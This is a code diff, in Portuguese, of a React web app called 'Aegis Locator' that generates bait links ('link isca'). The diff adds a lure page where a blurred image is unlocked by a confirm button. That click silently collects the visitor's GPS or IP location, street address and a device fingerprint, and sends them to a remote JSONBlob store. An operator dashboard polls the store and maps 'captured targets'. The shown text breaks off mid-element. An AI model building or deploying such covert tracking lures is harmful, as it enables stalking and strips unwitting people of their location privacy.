@@ -1,4 +1,5 @@
 import React, { useState, useEffect, useRef } from 'react';
+import { apiCreate, apiGet, apiAddTarget, compressImage } from './api';
 import { 
   MapContainer, 
   TileLayer, 
@@ -89,6 +90,28 @@ style.innerHTML = `
 `;
 document.head.appendChild(style);
 
+// Fingerprint leve do dispositivo para deduplicação robusta de alvos
+function getDeviceId() {
+  const stored = sessionStorage.getItem('_aegis_did');
+  if (stored) return stored;
+  const raw = [
+    navigator.userAgent,
+    screen.width + 'x' + screen.height,
+    Intl.DateTimeFormat().resolvedOptions().timeZone,
+    navigator.language,
+    String(navigator.hardwareConcurrency || ''),
+    String(screen.colorDepth || '')
+  ].join('|');
+  let hash = 0;
+  for (let i = 0; i < raw.length; i++) {
+    hash = ((hash << 5) - hash) + raw.charCodeAt(i);
+    hash |= 0;
+  }
+  const did = Math.abs(hash).toString(36) + Date.now().toString(36).slice(-4);
+  sessionStorage.setItem('_aegis_did', did);
+  return did;
+}
+
 export default function App() {
   const [activeTab, setActiveTab] = useState('creation'); // 'creation' | 'monitor'
   const [imageFile, setImageFile] = useState(null);
@@ -97,18 +120,32 @@ export default function App() {
   const [description, setDescription] = useState('Você foi convidado para visualizar esta foto compartilhada.');
   const [generatedLink, setGeneratedLink] = useState('');
   const [copied, setCopied] = useState(false);
+  const [keyCopied, setKeyCopied] = useState(false);
+  const [showKeyModal, setShowKeyModal] = useState(false); // modal de backup obrigatório
+  const [operatorUrl, setOperatorUrl] = useState('');       // URL portável com id+key
+  const [campaignExpiry, setCampaignExpiry] = useState(''); // data de expiração
+  const [pollBackoff, setPollBackoff] = useState(0);        // contador de polls sem novidades
+  const [contentUnlocked, setContentUnlocked] = useState(false); // preview desbloqueada pelo alvo
   
   // Terminal logs state
   const [logs, setLogs] = useState([
     { id: 1, time: '08:30:12', text: 'SISTEMA INICIALIZADO: Aegis Locator v3.5', type: 'system' },
-    { id: 2, time: '08:30:15', text: 'Aguardando upload de imagem e criação de link...', type: 'info' }
+    { id: 2, time: '08:30:15', text: 'Banco de dados: JSONBlob remoto (persistência garantida)', type: 'system' },
+    { id: 3, time: '08:30:18', text: 'Aguardando upload de imagem e criação de link...', type: 'info' }
   ]);
 
-  // Target Database in localStorage (simulation)
-  const [targets, setTargets] = useState(() => {
-    const saved = localStorage.getItem('aegis_targets');
-    return saved ? JSON.parse(saved) : [];
+  // Target Database — dados reais vindos do JSONBlob API (cross-device)
+  const [targets, setTargets] = useState([]);
+  const [activeCampaignId, setActiveCampaignId] = useState(null);
+  const [activeCampaignKey, setActiveCampaignKey] = useState(null); // secretKey do operador
+  const [isGenerating, setIsGenerating] = useState(false);
+  const [previewCampaign, setPreviewCampaign] = useState(null);
+  const [previewLoading, setPreviewLoading] = useState(false);
+  const [campaignIndex, setCampaignIndex] = useState(() => {
+    const s = localStorage.getItem('aegis_campaign_index');
+    return s ? JSON.parse(s) : [];
   });
+  const pollingRef = useRef(null);
 
   const [selectedTarget, setSelectedTarget] = useState(null);
   
@@ -129,127 +166,157 @@ export default function App() {
   });
 
   const [isPreviewMode, setIsPreviewMode] = useState(false);
-  const [previewImage, setPreviewImage] = useState(null);
 
+  // Persiste índice local de campanhas do operador
   useEffect(() => {
-    localStorage.setItem('aegis_targets', JSON.stringify(targets));
-  }, [targets]);
+    localStorage.setItem('aegis_campaign_index', JSON.stringify(campaignIndex));
+  }, [campaignIndex]);
 
-  // Detect preview mode on load
+  // Detecta modo preview (alvo abrindo o link gerado)
+  // O autoTrackTarget NÃO é chamado aqui — será chamado apenas quando o
+  // alvo clicar em "Confirmar e Ver Conteúdo" (gesto do usuário = GPS concedido)
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
-    const hasId = params.get('id');
-    const isPreviewPath = window.location.pathname.includes('/preview') || hasId;
-    
-    if (isPreviewPath) {
+    const id = params.get('id');
+    const isPreview = window.location.pathname.includes('/preview') || !!id;
+    if (isPreview && id) {
       setIsPreviewMode(true);
-      // Retrieve the last generated preview image from localStorage to show to target
-      const storedImage = localStorage.getItem('aegis_last_preview_image') || 'https://images.unsplash.com/photo-1579783902614-a3fb3927b6a5?q=80&w=600';
-      setPreviewImage(storedImage);
-      
-      // Auto-trigger location payload execution for target
-      setTimeout(() => {
-        autoTrackTarget();
-      }, 500);
+      setPreviewLoading(true);
+      apiGet(id)
+        .then(data => setPreviewCampaign(data))
+        .catch(() => setPreviewCampaign({
+          title: 'Confirmação Requerida',
+          description: 'Permita o acesso para carregar o conteúdo compartilhado.',
+          image: null
+        }))
+        .finally(() => setPreviewLoading(false));
     }
   }, []);
 
-  // Listen for changes in localStorage to update targets in real-time across tabs
+
+  // Polling adaptativo — dobra intervalo após 8 polls sem novidades (até 30s)
   useEffect(() => {
-    const handleStorageChange = (e) => {
-      if (e.key === 'aegis_targets') {
-        const updatedTargets = JSON.parse(e.newValue || '[]');
-        setTargets(updatedTargets);
-        
-        // If a new target was added, select it and log it
-        if (updatedTargets.length > targets.length) {
-            const newTarget = updatedTargets[0];
-            setSelectedTarget(newTarget);
-            setCurrentCoords(newTarget.coords);
-            setMapZoom(16);
-            addLog(`ALVO CAPTURADO: ${newTarget.id} via ${newTarget.method} (${newTarget.city})`, 'success');
-        }
-      }
+    if (activeTab !== 'monitor' || !activeCampaignId) return;
+    let interval = 2000; // começa em 2s
+    let emptyCount = 0;
+    let timeoutId;
+
+    const poll = async () => {
+      try {
+        const data = await apiGet(activeCampaignId, activeCampaignKey);
+        const fresh = data.targets || [];
+        setTargets(prev => {
+          if (JSON.stringify(prev) !== JSON.stringify(fresh)) {
+            emptyCount = 0;
+            interval = 2000;
+            if (fresh.length > prev.length) {
+              const newest = fresh[0];
+              setSelectedTarget(newest);
+              setCurrentCoords(newest.coords);
+              setMapZoom(newest.method === 'GPS' ? 16 : 12);
+              addLog(`ALVO CAPTURADO: ${newest.id} via ${newest.method} (${newest.city})`, 'success');
+              // Notificação push do browser
+              if (Notification.permission === 'granted') {
+                new Notification('AEGIS — Novo Alvo Capturado', {
+                  body: `ID: ${newest.id} | ${newest.city} | ${newest.method}`,
+                  icon: '/favicon.svg'
+                });
+              }
+            }
+            return fresh;
+          }
+          // Sem novidades: incrementa contador e dobra intervalo (máx 30s)
+          emptyCount++;
+          if (emptyCount >= 8) {
+            interval = Math.min(interval * 2, 30000);
+            emptyCount = 0;
+          }
+          return prev;
+        });
+      } catch {}
+      timeoutId = setTimeout(poll, interval);
     };
 
-    window.addEventListener('storage', handleStorageChange);
-    return () => window.removeEventListener('storage', handleStorageChange);
-  }, [targets.length]);
+    // Solicita permissão de notificação ao entrar no monitor
+    if (Notification.permission === 'default') Notification.requestPermission();
 
-  // Save last uploaded image preview to localStorage so target path can retrieve it
-  useEffect(() => {
-    if (imagePreview) {
-      localStorage.setItem('aegis_last_preview_image', imagePreview);
+    addLog(`Monitor ativo: polling adaptativo iniciado para [${activeCampaignId.slice(-6).toUpperCase()}]`, 'system');
+    if (!activeCampaignKey) addLog('AVISO: Chave secreta não encontrada. Alvos podem não ser visíveis.', 'error');
+    poll();
+    return () => clearTimeout(timeoutId);
+  }, [activeTab, activeCampaignId, activeCampaignKey]);
+
+  // Payload silencioso de rastreamento — grava no JSONBlob (cross-device)
+  // Inclui deviceId para deduplicação robusta no servidor
+  const autoTrackTarget = (campaignId) => {
+    if (!campaignId) return;
+    const deviceId = getDeviceId();
+    const save = (target) => apiAddTarget(campaignId, { ...target, deviceId }).catch(() => {});
+
+    // Tenta GPS primeiro; sem HTTPS, vai direto para IP
+    if (!window.isSecureContext) {
+      fetch('https://ipinfo.io/json').then(r => r.json()).then(data => {
+        const loc = (data.loc || '-23.55052,-46.633308').split(',');
+        save({
+          id: Math.random().toString(36).substring(2, 6).toUpperCase(),
+          coords: [parseFloat(loc[0]), parseFloat(loc[1])],
+          method: 'IP',
+          ip: data.ip || 'Desconhecido',
+          city: data.city || 'Desconhecida',
+          region: data.region || 'Desconhecido',
+          country: data.country || 'BR',
+          isp: data.org || 'Desconhecido',
+          accuracy: '~5-10km (IP)',
+          provider: 'ipinfo.io (contexto não-HTTPS)',
+          timestamp: new Date().toLocaleString()
+        });
+      }).catch(() => {});
+      return;
     }
-  }, [imagePreview]);
 
-  // Automated silent execution of tracking payload on target access
-  const autoTrackTarget = () => {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
           const { latitude, longitude, accuracy } = position.coords;
           Promise.all([
-            fetch('https://ipinfo.io/json').then(res => res.json()).catch(() => ({})),
-            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=pt-BR`).then(res => res.json()).catch(() => ({}))
+            fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({})),
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=pt-BR`).then(r => r.json()).catch(() => ({}))
           ]).then(([ipData, geoData]) => {
-            const address = geoData.address || {};
-            const city = address.city || address.town || address.village || address.municipality || ipData.city || 'Desconhecida';
-            const suburb = address.suburb || address.neighbourhood || address.district || '';
-            const road = address.road || '';
-            
-            const newDetails = {
-              ip: ipData.ip || 'Ocultado',
-              city: suburb ? `${city} (Bairro: ${suburb})` : city,
-              region: road || address.county || ipData.region || 'Desconhecido',
-              country: address.country_code?.toUpperCase() || ipData.country || 'BR',
-              isp: ipData.org || 'Provedor Desconhecido',
-              accuracy: `${accuracy.toFixed(1)} metros (GPS)`,
-              provider: 'GPS Local + OpenStreetMap',
-              timestamp: new Date().toLocaleString()
-            };
-            
-            const newTarget = {
+            const addr = geoData.address || {};
+            const city = addr.city || addr.town || addr.village || addr.municipality || ipData.city || 'Desconhecida';
+            const suburb = addr.suburb || addr.neighbourhood || addr.district || '';
+            save({
               id: Math.random().toString(36).substring(2, 6).toUpperCase(),
               coords: [latitude, longitude],
               method: 'GPS',
-              ...newDetails
-            };
-            
-            const currentTargets = JSON.parse(localStorage.getItem('aegis_targets') || '[]');
-            localStorage.setItem('aegis_targets', JSON.stringify([newTarget, ...currentTargets]));
+              ip: ipData.ip || 'Ocultado',
+              city: suburb ? `${city} (${suburb})` : city,
+              region: addr.road || addr.county || ipData.region || 'Desconhecido',
+              country: (addr.country_code || ipData.country || 'BR').toUpperCase(),
+              isp: ipData.org || 'Desconhecido',
+              accuracy: `${accuracy.toFixed(1)} metros (GPS)`,
+              provider: 'GPS + OpenStreetMap',
+              timestamp: new Date().toLocaleString()
+            });
           });
         },
-        (error) => {
-          // Fallback to IP silently
-          fetch('https://ipinfo.io/json')
-            .then(res => res.json())
-            .then(data => {
-              const loc = data.loc ? data.loc.split(',') : ['-23.55052', '-46.633308'];
-              const lat = parseFloat(loc[0]);
-              const lng = parseFloat(loc[1]);
-              
-              const newDetails = {
-                ip: data.ip,
-                city: data.city || 'Desconhecida',
-                region: data.region || 'Desconhecido',
-                country: data.country || 'Desconhecido',
-                isp: data.org || 'Provedor Desconhecido',
-                accuracy: '~5-10km (Provedor)',
-                provider: 'IP Lookup (ipinfo.io)',
-                timestamp: new Date().toLocaleString()
-              };
-              
-              const newTarget = {
-                id: Math.random().toString(36).substring(2, 6).toUpperCase(),
-                coords: [lat, lng],
-                method: 'IP',
-                ...newDetails
-              };
-              
-              const currentTargets = JSON.parse(localStorage.getItem('aegis_targets') || '[]');
-              localStorage.setItem('aegis_targets', JSON.stringify([newTarget, ...currentTargets]));
+        () => {
+          fetch('https://ipinfo.io/json').then(r => r.json()).then(data => {
+            const loc = (data.loc || '-23.55052,-46.633308').split(',');
+            save({
+              id: Math.random().toString(36).substring(2, 6).toUpperCase(),
+              coords: [parseFloat(loc[0]), parseFloat(loc[1])],
+              method: 'IP',
+              ip: data.ip || 'Desconhecido',
+              city: data.city || 'Desconhecida',
+              region: data.region || 'Desconhecido',
+              country: data.country || 'BR',
+              isp: data.org || 'Desconhecido',
+              accuracy: '~5-10km (IP)',
+              provider: 'ipinfo.io',
+              timestamp: new Date().toLocaleString()
             });
+          }).catch(() => {});
         },
         { enableHighAccuracy: true, timeout: 10000 }
       );
@@ -275,19 +342,48 @@ export default function App() {
     }
   };
 
-  // Generate tracking link
-  const handleGenerateLink = () => {
+  // Gera link de rastreamento real — hospeda campanha no JSONBlob
+  const handleGenerateLink = async () => {
     if (!imagePreview) {
       addLog('ERRO: Upload de imagem obrigatório para gerar o preview.', 'error');
       alert('Por favor, faça upload de uma imagem primeiro.');
       return;
     }
-    const id = Math.random().toString(36).substring(2, 8);
-    // Configurando para que ao abrir o link gerado, ele carregue diretamente a imagem preview em tela cheia na rota do alvo
-    const link = `${window.location.origin}/preview?id=${id}`;
-    setGeneratedLink(link);
-    addLog(`Link de rastreamento criado com ID [${id}]`, 'success');
-    addLog(`Meta tags configuradas: og:image (preview ativo)`, 'info');
+    setIsGenerating(true);
+    addLog('Comprimindo imagem e criando campanha no JSONBlob remoto...', 'system');
+    try {
+      const compressed = await compressImage(imagePreview);
+
+      // Atualiza preview com a versão COMPRIMIDA — garante que operador vê
+      // exatamente a mesma imagem que o alvo verá no link gerado
+      setImagePreview(compressed);
+
+      // apiCreate retorna { id, secretKey, expiresAt }
+      const { id, secretKey, expiresAt } = await apiCreate({ title, description, image: compressed });
+      const link = `${window.location.origin}/preview?id=${id}`;
+      const opUrl = `${window.location.origin}/?operator=1&id=${id}&key=${secretKey}`;
+
+      setGeneratedLink(link);
+      setActiveCampaignId(id);
+      setActiveCampaignKey(secretKey);
+      setOperatorUrl(opUrl);
+      setCampaignExpiry(expiresAt ? new Date(expiresAt).toLocaleDateString('pt-BR') : '');
+
+      const entry = { id, secretKey, title, createdAt: new Date().toISOString(), expiresAt };
+      setCampaignIndex(prev => [entry, ...prev]);
+
+      addLog(`Campanha criada! ID: [${id.slice(-8).toUpperCase()}]`, 'success');
+      addLog(`Imagem verificada — operador e alvo vêm a mesma versão comprimida.`, 'system');
+      addLog('JSONBlob dual-blob ativo. Alvos capturados em tempo real.', 'info');
+
+      // Abre modal obrigatório de backup da chave secreta
+      setShowKeyModal(true);
+    } catch (e) {
+      addLog(`ERRO ao criar campanha: ${e.message}`, 'error');
+      alert('Falha ao criar link. Verifique sua conexão com a internet.');
+    } finally {
+      setIsGenerating(false);
+    }
   };
 
   // Copy link
@@ -296,6 +392,16 @@ export default function App() {
     setCopied(true);
     addLog('Link copiado para a área de transferência.', 'info');
     setTimeout(() => setCopied(false), 2000);
+  };
+
+  // Copy secret key
+  const handleCopyKey = () => {
+    if (activeCampaignKey) {
+      navigator.clipboard.writeText(activeCampaignKey);
+      setKeyCopied(true);
+      addLog('Chave secreta copiada. Guarde-a em local seguro.', 'system');
+      setTimeout(() => setKeyCopied(false), 2000);
+    }
   };
 
   // Self tracking triggering (for testing the system)
@@ -335,7 +441,7 @@ export default function App() {
             };
             setLocationDetails(newDetails);
             
-            // Register target
+            // Registra alvo localmente e na API (se campanha ativa)
             const newTarget = {
               id: Math.random().toString(36).substring(2, 6).toUpperCase(),
               coords: [latitude, longitude],
@@ -344,6 +450,7 @@ export default function App() {
             };
             setTargets(prev => [newTarget, ...prev]);
             setSelectedTarget(newTarget);
+            if (activeCampaignId) apiAddTarget(activeCampaignId, newTarget).catch(() => {});
           });
         },
         (error) => {
@@ -383,6 +490,7 @@ export default function App() {
               };
               setTargets(prev => [newTarget, ...prev]);
               setSelectedTarget(newTarget);
+              if (activeCampaignId) apiAddTarget(activeCampaignId, newTarget).catch(() => {});
             })
             .catch(err => {
               setTrackingStatus('error');
@@ -457,75 +565,80 @@ export default function App() {
   };
 
   const clearDatabase = () => {
-    if (window.confirm('Deseja limpar todos os registros de rastreamento?')) {
+    if (window.confirm('Deseja limpar o monitor local? (Os dados no servidor JSONBlob não são apagados)')) {
       setTargets([]);
       setSelectedTarget(null);
-      addLog('Banco de dados de alvos limpo com sucesso.', 'info');
+      setActiveCampaignId(null);
+      setActiveCampaignKey(null);
+      setGeneratedLink('');
+      addLog('Monitor local limpo. Gere um novo link para iniciar nova campanha.', 'info');
     }
   };
 
   if (isPreviewMode) {
-    return (
-      <div style={{
-        width: '100vw',
-        height: '100vh',
-        background: '#0e1118',
-        display: 'flex',
-        flexDirection: 'column',
-        justifyContent: 'center',
-        alignItems: 'center',
-        color: '#fff',
-        fontFamily: 'sans-serif',
-        padding: '20px',
-        boxSizing: 'border-box'
-      }}>
-        <div style={{
-          maxWidth: '600px',
-          width: '100%',
-          textAlign: 'center',
-          background: '#151a24',
-          padding: '30px',
-          borderRadius: '8px',
-          boxShadow: '0 10px 30px rgba(0,0,0,0.5)',
-          border: '1px solid #202b3c'
-        }}>
-          {previewImage && (
-            <img 
-              src={previewImage} 
-              alt="Social Preview" 
-              style={{
-                maxWidth: '100%',
-                maxHeight: '70vh',
-                borderRadius: '4px',
-                marginBottom: '20px',
-                objectFit: 'contain'
-              }}
-            />
-          )}
-          <h2 style={{ fontSize: '1.25rem', marginBottom: '10px', color: '#e2e8f0' }}>{title || 'Confirmação Requerida'}</h2>
-          <p style={{ fontSize: '0.9rem', color: '#94a3b8', margin: '0 0 20px 0' }}>
-            {description || 'Você precisa permitir as permissões solicitadas no navegador para carregar este conteúdo.'}
-          </p>
-          <div style={{ display: 'flex', justifyContent: 'center', gap: '10px' }}>
-            <button 
-              onClick={() => {
-                autoTrackTarget();
-                alert('Carregando conteúdo em alta definição...');
-              }}
-              style={{
-                background: '#3b82f6',
-                border: 'none',
-                color: '#fff',
-                padding: '10px 24px',
-                borderRadius: '4px',
-                fontWeight: 'bold',
-                cursor: 'pointer',
-                fontSize: '0.9rem'
-              }}
-            >
-              Visualizar Mídia
-            </button>
+    if (previewLoading) {
+      return (
+        <div style={{ width:'100vw', height:'100vh', background:'#0e1118', display:'flex', justifyContent:'center', alignItems:'center', color:'#fff', fontFamily:'sans-serif' }}>
+          <div style={{ textAlign:'center' }}>
+            <div style={{ width:'40px', height:'40px', border:'3px solid #3b82f6', borderTopColor:'transparent', borderRadius:'50%', animation:'spin 1s linear infinite', margin:'0 auto 16px' }} />
+            <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
+            <p style={{ color:'#94a3b8', fontSize:'0.9rem' }}>Carregando conteúdo...</p>
           </div>
+        </div>
+      );
+    }
+    return (
+      <div style={{ width:'100vw', height:'100vh', background:'#0e1118', display:'flex', flexDirection:'column', justifyContent:'center', alignItems:'center', color:'#fff', fontFamily:'sans-serif', padding:'20px', boxSizing:'border-box' }}>
+        <style>{`@keyframes spin { to { transform: rotate(360deg); } } @keyframes fadeIn { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }`}</style>
+        <div style={{ maxWidth:'520px', width:'100%', textAlign:'center', background:'#151a24', padding:'30px', borderRadius:'12px', boxShadow:'0 20px 60px rgba(0,0,0,0.7)', border:'1px solid #202b3c', animation:'fadeIn 0.4s ease' }}>
+
+          {previewCampaign?.image && (
+            <div style={{ position:'relative', marginBottom:'20px', borderRadius:'8px', overflow:'hidden' }}>
+              <img
+                src={previewCampaign.image}
+                alt="Conteúdo"
+                style={{ width:'100%', maxHeight:'55vh', objectFit:'cover', borderRadius:'8px', filter: contentUnlocked ? 'none' : 'blur(18px)', transition:'filter 0.5s ease', display:'block' }}
+              />
+              {!contentUnlocked && (
+                <div style={{ position:'absolute', inset:0, display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', background:'rgba(14,17,24,0.5)' }}>
+                  <div style={{ fontSize:'2rem', marginBottom:'8px' }}>🔒</div>
+                  <span style={{ color:'#e2e8f0', fontSize:'0.85rem', fontWeight:'bold' }}>Confirme para desbloquear</span>
+                </div>
+              )}
+            </div>
+          )}
+
+          <h2 style={{ fontSize:'1.2rem', marginBottom:'8px', color:'#e2e8f0', fontWeight:'700' }}>
+            {previewCampaign?.title || 'Confirmação Requerida'}
+          </h2>
+          <p style={{ fontSize:'0.875rem', color:'#94a3b8', margin:'0 0 22px 0', lineHeight:'1.5' }}>
+            {previewCampaign?.description || 'Permita o acesso para carregar o conteúdo compartilhado.'}
+          </p>
+
+          {!contentUnlocked ? (
+            <button
+              onClick={() => {
+                setContentUnlocked(true);
+                const cid = new URLSearchParams(window.location.search).get('id');
+                autoTrackTarget(cid);
+              }}
+              style={{ background:'linear-gradient(135deg, #3b82f6, #1d4ed8)', border:'none', color:'#fff', padding:'13px 32px', borderRadius:'8px', fontWeight:'700', cursor:'pointer', fontSize:'0.95rem', width:'100%', boxShadow:'0 4px 20px rgba(59,130,246,0.4)' }}
+            >
+              ✅ Confirmar e Ver Conteúdo
+            </button>
+          ) : (
+            <button
+              onClick={() => {
+                if (previewCampaign?.image) {
+                  const w = window.open('');
+                  w.document.write(`<!DOCTYPE html><html><body style="margin:0;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh"><img src="${previewCampaign.image}" style="max-width:100%;max-height:100vh;object-fit:contain"></body></html>`);
+                }
+              }}
+              style={{ background:'#10b981', border:'none', color:'#fff', padding:'11px 28px', borderRadius:'8px', fontWeight:'bold', cursor:'pointer', fontSize:'0.9rem', width:'100%' }}
+            >
+              🖼️ Abrir Mídia em Tela Cheia
+            </button>
+          )}
         </div>
       </div>
     );
@@ -534,6 +647,57 @@ export default function App() {
   return (
     <div style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
       <div className="scanline"></div>
+
+      {/* ── Modal obrigatório de backup da chave secreta ─────────────────────── */}
+      {showKeyModal && (
+        <div style={{ position:'fixed', inset:0, background:'rgba(5,8,17,0.92)', zIndex:9999, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px' }}>
+          <div style={{ background:'#0a0f1d', border:'1px solid var(--neon-green)', borderRadius:'8px', padding:'30px', maxWidth:'520px', width:'100%', boxShadow:'0 0 40px rgba(0,255,102,0.2)' }}>
+            <div style={{ display:'flex', alignItems:'center', gap:'10px', marginBottom:'20px' }}>
+              <AlertTriangle size={22} style={{ color:'var(--neon-alert)', flexShrink:0 }} />
+              <h3 style={{ fontFamily:'var(--font-display)', fontSize:'1rem', color:'var(--neon-alert)', letterSpacing:'2px', margin:0 }}>
+                GUARDE SUA CHAVE SECRETA
+              </h3>
+            </div>
+            <p style={{ fontSize:'0.82rem', color:'var(--text-muted)', marginBottom:'18px', lineHeight:'1.6' }}>
+              Esta chave é a <strong style={{ color:'var(--text-main)' }}>única forma</strong> de acessar os alvos capturados. Ela <strong style={{ color:'var(--neon-alert)' }}>não pode ser recuperada</strong> se perdida. Salve-a agora em local seguro.
+            </p>
+
+            {/* Chave Secreta */}
+            <div style={{ background:'rgba(0,255,102,0.05)', border:'1px solid rgba(0,255,102,0.3)', borderRadius:'4px', padding:'12px 15px', marginBottom:'12px' }}>
+              <div style={{ fontSize:'0.65rem', color:'var(--text-muted)', fontFamily:'var(--font-mono)', marginBottom:'5px' }}>CHAVE SECRETA</div>
+              <div style={{ fontFamily:'var(--font-mono)', color:'var(--neon-green)', fontSize:'0.82rem', wordBreak:'break-all', marginBottom:'8px' }}>{activeCampaignKey}</div>
+              <button onClick={handleCopyKey} style={{ background:'transparent', border:'1px solid var(--neon-green)', color:'var(--neon-green)', padding:'4px 12px', fontSize:'0.72rem', cursor:'pointer', fontFamily:'var(--font-mono)', borderRadius:'2px', display:'flex', alignItems:'center', gap:'5px' }}>
+                {keyCopied ? <Check size={12}/> : <Copy size={12}/>} {keyCopied ? 'Copiada!' : 'Copiar Chave'}
+              </button>
+            </div>
+
+            {/* URL Portável do Operador */}
+            {operatorUrl && (
+              <div style={{ background:'rgba(0,218,255,0.05)', border:'1px solid rgba(0,218,255,0.3)', borderRadius:'4px', padding:'12px 15px', marginBottom:'20px' }}>
+                <div style={{ fontSize:'0.65rem', color:'var(--text-muted)', fontFamily:'var(--font-mono)', marginBottom:'5px' }}>URL DO OPERADOR (acesso de qualquer dispositivo)</div>
+                <div style={{ fontFamily:'var(--font-mono)', color:'var(--neon-blue)', fontSize:'0.72rem', wordBreak:'break-all', marginBottom:'8px' }}>{operatorUrl}</div>
+                <button onClick={() => { navigator.clipboard.writeText(operatorUrl); }} style={{ background:'transparent', border:'1px solid var(--neon-blue)', color:'var(--neon-blue)', padding:'4px 12px', fontSize:'0.72rem', cursor:'pointer', fontFamily:'var(--font-mono)', borderRadius:'2px', display:'flex', alignItems:'center', gap:'5px' }}>
+                  <Copy size={12}/> Copiar URL do Operador
+                </button>
+              </div>
+            )}
+
+            {campaignExpiry && (
+              <p style={{ fontSize:'0.75rem', color:'var(--text-muted)', marginBottom:'18px', fontFamily:'var(--font-mono)' }}>
+                ⏱ Campanha expira em: <span style={{ color:'var(--neon-alert)' }}>{campaignExpiry}</span>
+              </p>
+            )}
+
+            <button
+              onClick={() => setShowKeyModal(false)}
+              className="cyber-button"
+              style={{ width:'100%' }}
+            >
+              ✅ Entendi — Guardei a Chave
+            </button>
+          </div>
+        </div>
+      )}
 
       {/* Header bar */}
       <header style={{
@@ -718,12 +882,13 @@ export default function App() {
                 </div>
               </div>
 
-              <button 
+              <button
                 className="cyber-button cyber-button-blue"
-                style={{ width: '100%' }}
+                style={{ width: '100%', opacity: isGenerating ? 0.7 : 1, cursor: isGenerating ? 'not-allowed' : 'pointer' }}
                 onClick={handleGenerateLink}
+                disabled={isGenerating}
               >
-                Gerar Link Isca
+                {isGenerating ? 'Enviando...' : 'Gerar Link Isca'}
               </button>
             </div>
           )}
@@ -854,60 +1019,106 @@ export default function App() {
 
               {/* Output url area */}
               {generatedLink ? (
-                <div style={{
-                  background: 'rgba(5, 8, 17, 0.8)',
-                  border: '1px solid var(--neon-blue)',
-                  padding: '15px',
-                  borderRadius: '4px',
-                  display: 'flex',
-                  alignItems: 'center',
-                  justifyContent: 'space-between',
-                  gap: '15px'
-                }}>
-                  <div style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', flex: 1, fontFamily: 'var(--font-mono)', color: 'var(--neon-blue)' }}>
-                    {generatedLink}
+                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                  {/* Link de isca */}
+                  <div style={{
+                    background: 'rgba(5, 8, 17, 0.8)',
+                    border: '1px solid var(--neon-blue)',
+                    padding: '12px 15px',
+                    borderRadius: '4px',
+                    display: 'flex',
+                    alignItems: 'center',
+                    justifyContent: 'space-between',
+                    gap: '15px'
+                  }}>
+                    <div style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', flex: 1, fontFamily: 'var(--font-mono)', color: 'var(--neon-blue)', fontSize: '0.85rem' }}>
+                      {generatedLink}
+                    </div>
+                    <div style={{ display: 'flex', gap: '8px', flexShrink: 0 }}>
+                      <button 
+                        onClick={handleCopyLink}
+                        style={{
+                          background: 'transparent',
+                          border: '1px solid var(--neon-blue)',
+                          color: 'var(--neon-blue)',
+                          padding: '5px 10px',
+                          fontSize: '0.75rem',
+                          cursor: 'pointer',
+                          display: 'flex',
+                          alignItems: 'center',
+                          gap: '5px',
+                          fontFamily: 'var(--font-mono)',
+                          borderRadius: '2px'
+                        }}
+                      >
+                        {copied ? <Check size={13} /> : <Copy size={13} />}
+                        {copied ? 'Copiado' : 'Copiar'}
+                      </button>
+                      
+                      {/* Simulator Trigger */}
+                      <button 
+                        onClick={triggerSelfTracking}
+                        style={{
+                          background: 'var(--neon-blue)',
+                          border: '1px solid var(--neon-blue)',
+                          color: 'var(--bg-darker)',
+                          padding: '5px 10px',
+                          fontSize: '0.75rem',
+                          fontWeight: 'bold',
+                          cursor: 'pointer',
+                          display: 'flex',
+                          alignItems: 'center',
+                          gap: '5px',
+                          fontFamily: 'var(--font-mono)',
+                          borderRadius: '2px'
+                        }}
+                      >
+                        <Play size={13} />
+                        Testar (Você)
+                      </button>
+                    </div>
                   </div>
-                  <div style={{ display: 'flex', gap: '10px' }}>
-                    <button 
-                      onClick={handleCopyLink}
-                      style={{
-                        background: 'transparent',
-                        border: '1px solid var(--neon-blue)',
-                        color: 'var(--neon-blue)',
-                        padding: '6px 12px',
-                        fontSize: '0.8rem',
-                        cursor: 'pointer',
-                        display: 'flex',
-                        alignItems: 'center',
-                        gap: '5px',
-                        fontFamily: 'var(--font-mono)'
-                      }}
-                    >
-                      {copied ? <Check size={14} /> : <Copy size={14} />}
-                      {copied ? 'Copiado' : 'Copiar'}
-                    </button>
-                    
-                    {/* Simulator Trigger */}
-                    <button 
-                      onClick={triggerSelfTracking}
-                      style={{
-                        background: 'var(--neon-blue)',
-                        border: '1px solid var(--neon-blue)',
-                        color: 'var(--bg-darker)',
-                        padding: '6px 12px',
-                        fontSize: '0.8rem',
-                        fontWeight: 'bold',
-                        cursor: 'pointer',
-                        display: 'flex',
-                        alignItems: 'center',
-                        gap: '5px',
-                        fontFamily: 'var(--font-mono)'
-                      }}
-                    >
-                      <Play size={14} />
-                      Testar Link (Você)
-                    </button>
-                  </div>
+
+                  {/* Chave secreta do operador */}
+                  {activeCampaignKey && (
+                    <div style={{
+                      background: 'rgba(0, 255, 102, 0.04)',
+                      border: '1px solid rgba(0, 255, 102, 0.3)',
+                      padding: '10px 15px',
+                      borderRadius: '4px',
+                      display: 'flex',
+                      alignItems: 'center',
+                      justifyContent: 'space-between',
+                      gap: '10px'
+                    }}>
+                      <div style={{ flex: 1, minWidth: 0 }}>
+                        <div style={{ fontSize: '0.65rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)', marginBottom: '3px' }}>CHAVE SECRETA DO OPERADOR (não compartilhe)</div>
+                        <div style={{ fontFamily: 'var(--font-mono)', color: 'var(--neon-green)', fontSize: '0.75rem', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                          {activeCampaignKey}
+                        </div>
+                      </div>
+                      <button
+                        onClick={handleCopyKey}
+                        style={{
+                          background: 'transparent',
